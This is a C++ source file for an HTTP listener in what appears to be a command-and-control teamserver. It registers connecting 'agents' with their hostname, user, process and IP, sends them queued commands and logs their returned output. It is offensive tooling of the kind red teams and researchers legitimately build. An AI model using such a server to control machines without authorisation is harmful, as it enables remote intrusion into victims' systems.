#include "Listeners.h"

#include "../windows/ui_TeamserverWindow.h"

#include "Agents.h"
#include "Constants.h"
#include "../windows/teamserverwindow.h"

void HTTPListenerThread::run() {

    svr.Post(R"(.*)",[this](const httplib::Request &req, httplib::Response &res) {
    printf("Received POST to: %s\n", req.path.c_str());
    try {
        // Parse the JSON data from the request body
        auto json_data = nlohmann::json::parse(req.body);

        // Convert the JSON to a CallbackFull object
        CallbackFull full = CallbackFull::from_json(json_data);

        // Does the Agent already exist?
        auto it = std::ranges::find_if(main_window->g_Agents,
    [&full](Agent& a) { return a.id == full.metadata.id; });

        if (it == main_window->g_Agents.end()) {
            // Agent isn't found – add new
            Agent new_agent(full.metadata.id,
                            full.metadata.hostname,
                            full.metadata.user,
                            full.metadata.process,
                            full.metadata.ip);
            new_agent.cmd_history.push_back("[*] Agent connected - " + full.metadata.id + "\n");
            main_window->g_Agents.push_back(new_agent);
            main_window->log_activity("New Agent connected - " + full.metadata.id);
            // Refresh for new addition
            main_window->ui->agentTable->repopulateItems();
            return httplib::Server::HandlerResponse::Handled;
        }
        // Agent exists – reset last_alive
        it->last_alive = 0;
        // Check if agent has queue and update history/activity
        if (!it->cmd_queue.empty()) {
            main_window->log_activity("Issued commands for Agent " + it->id);
            it->cmd_history.push_back(MSG_COMMAND_SENT);
        }
        // Extract output
        if (full.data.size() > 0) {
            it->cmd_history.push_back(MSG_OUTPUT_RECEIVED);
            for (const std::string& output : full.data) {
                it->cmd_history.push_back(output);
            }
        }
        // Send and reset queue
        res.set_content(nlohmann::json(it->cmd_queue).dump(), "application/json");
        res.status = 200;
        it->cmd_queue.clear();
        // Refresh
        emit main_window->agentUpdated();
        return httplib::Server::HandlerResponse::Handled;

    } catch (const std::exception& e) {
        // If there is a parsing error, respond with an error
        res.status = 400;
        res.set_content("{\"status\":\"error\",\"message\":\"Invalid JSON\"}", "application/json");
        return httplib::Server::HandlerResponse::Handled;
    }
});

    // Start the server
    svr.listen_after_bind();
}